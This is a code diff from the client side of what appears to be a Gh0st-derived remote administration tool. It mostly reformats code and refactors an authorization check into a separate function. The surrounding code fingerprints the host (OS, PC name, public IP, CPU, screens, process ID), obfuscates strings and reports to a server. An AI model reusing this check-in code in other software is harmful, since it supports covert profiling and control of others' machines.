@@ -48,16 +48,14 @@ std::string getSystemName()
                 vname = "Windows Server 2019";
             else
                 vname = "Windows Server 2016";
-        }
-        else {
+        } else {
             // Windows 桌面版
             if (dwBuildNumber >= 22000)
                 vname = "Windows 11";
             else
                 vname = "Windows 10";
         }
-    }
-    else if (dwMajor == 6) {
+    } else if (dwMajor == 6) {
         switch (dwMinor) {
         case 3:
             vname = isServer ? "Windows Server 2012 R2" : "Windows 8.1";
@@ -72,8 +70,7 @@ std::string getSystemName()
             vname = isServer ? "Windows Server 2008" : "Windows Vista";
             break;
         }
-    }
-    else if (dwMajor == 5) {
+    } else if (dwMajor == 5) {
         switch (dwMinor) {
         case 2:
             vname = "Windows Server 2003";
@@ -227,7 +224,7 @@ std::string GetCurrentUserNameA()
 }
 
 #define XXH_INLINE_ALL
-#include "server/2015Remote/xxhash.h"
+#include "common/xxhash.h"
 // 基于客户端信息计算唯一ID: { IP, PC, OS, CPU, PATH }
 uint64_t CalcalateID(const std::vector<std::string>& clientInfo)
 {
@@ -239,9 +236,33 @@ uint64_t CalcalateID(const std::vector<std::string>& clientInfo)
     return XXH64(s.c_str(), s.length(), 0);
 }
 
-LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKernel)
+BOOL IsAuthKernel(std::string &str) {
+    BOOL isAuthKernel = FALSE;
+    std::string pid = std::to_string(GetCurrentProcessId());
+    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
+    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
+    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+    char buf[_MAX_PATH] = {};
+    GetModuleFileNameA(NULL, buf, sizeof(buf));
+    GetFileAttributesExA(buf, GetFileExInfoStandard, &fileInfo);
+    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024) {
+        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
+        isAuthKernel = TRUE;
+        config* cfg = IsDebug ? new config : new iniFile;
+        str = cfg->GetStr("settings", "Password", "");
+        delete cfg;
+        str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
+        auto list = StringToVector(str, '-', 3);
+        str = list[1].empty() ? "Unknown" : list[1];
+    }
+    SAFE_CLOSE_HANDLE(hEvent1);
+    SAFE_CLOSE_HANDLE(hEvent2);
+    return isAuthKernel;
+}
+
+LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, const std::string& expiredDate)
 {
-    isAuthKernel = FALSE;
+    std::string str = expiredDate;
     iniFile cfg(CLIENT_PATH);
     LOGIN_INFOR  LoginInfor;
     LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
@@ -283,25 +304,9 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKerne
     LoginInfor.AddReserved(installTime.c_str());		// 安装时间
     LoginInfor.AddReserved("?");						// 安装信息
     LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
-    std::string str;
     std::string masterHash(skCrypt(MASTER_HASH));
-    std::string pid = std::to_string(GetCurrentProcessId());
-    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
-    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
     WIN32_FILE_ATTRIBUTE_DATA fileInfo;
     GetFileAttributesExA(buf, GetFileExInfoStandard, &fileInfo);
-    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024) {
-        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
-        isAuthKernel = TRUE;
-        SAFE_CLOSE_HANDLE(hEvent1);
-        SAFE_CLOSE_HANDLE(hEvent2);
-        config*cfg = conn.pwdHash == masterHash ? new config : new iniFile;
-        str = cfg->GetStr("settings", "Password", "");
-        delete cfg;
-        str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
-        auto list = StringToVector(str, '-', 3);
-        str = list[1].empty() ? "Unknown" : list[1];
-    }
     LoginInfor.AddReserved(str.c_str());			   // 授权信息
     bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
                      strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
@@ -328,21 +333,21 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKerne
     char cpuInfo[32];
     sprintf(cpuInfo, "%dMHz", dwCPUMHz);
     conn.clientID = CalcalateID({ pubIP, szPCName, LoginInfor.OsVerInfoEx, cpuInfo, buf });
-	auto clientID = std::to_string(conn.clientID);
+    auto clientID = std::to_string(conn.clientID);
     Mprintf("此客户端的唯一标识为: %s\n", clientID.c_str());
-	char reservedInfo[64];
+    char reservedInfo[64];
     int m_iScreenX = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     int m_iScreenY = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-	auto list = ScreenCapture::GetAllMonitors();
-	sprintf_s(reservedInfo, "%d:%d*%d", (int)list.size(), m_iScreenX, m_iScreenY);
-	LoginInfor.AddReserved(reservedInfo);               // 屏幕分辨率
-	LoginInfor.AddReserved(clientID.c_str());           // 客户端路径
-	LoginInfor.AddReserved((int)GetCurrentProcessId()); // 进程ID
-	char fileSize[32];
-	double MB = fileInfo.nFileSizeLow > 1024 * 1024 ? fileInfo.nFileSizeLow / (1024.0 * 1024.0) : 0;
-	double KB = fileInfo.nFileSizeLow > 1024 ? fileInfo.nFileSizeLow / 1024.0 : 0;
-	sprintf_s(fileSize, "%.1f%s", MB > 0 ? MB : KB, MB > 0 ? "M" : "K");
-	LoginInfor.AddReserved(fileSize);                  // 文件大小
+    auto list = ScreenCapture::GetAllMonitors();
+    sprintf_s(reservedInfo, "%d:%d*%d", (int)list.size(), m_iScreenX, m_iScreenY);
+    LoginInfor.AddReserved(reservedInfo);               // 屏幕分辨率
+    LoginInfor.AddReserved(clientID.c_str());           // 客户端路径
+    LoginInfor.AddReserved((int)GetCurrentProcessId()); // 进程ID
+    char fileSize[32];
+    double MB = fileInfo.nFileSizeLow > 1024 * 1024 ? fileInfo.nFileSizeLow / (1024.0 * 1024.0) : 0;
+    double KB = fileInfo.nFileSizeLow > 1024 ? fileInfo.nFileSizeLow / 1024.0 : 0;
+    sprintf_s(fileSize, "%.1f%s", MB > 0 ? MB : KB, MB > 0 ? "M" : "K");
+    LoginInfor.AddReserved(fileSize);                  // 文件大小
     return LoginInfor;
 }
 
